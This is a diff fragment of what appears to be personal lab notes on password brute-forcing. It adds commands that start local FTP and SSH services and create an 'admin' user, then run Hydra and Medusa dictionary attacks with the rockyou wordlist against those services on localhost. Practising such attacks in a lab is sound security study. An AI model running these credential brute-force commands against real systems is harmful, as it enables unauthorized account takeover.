@@ -56,6 +56,24 @@ http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 
 
 
+sudo service vsftpd start
+
+netstat -tuln | grep :21
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ftp -t 4 -f
+
+ssh
+sudo apt install openssh-server
+sudo service ssh start
+sudo service ssh status
+sudo adduser admin
+ssh admin@127.0.0.1 
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 2 -f
+
+
+medusa -h 127.0.0.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f
+medusa -h 127.0.0.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp -t 4 -f
 
 
 
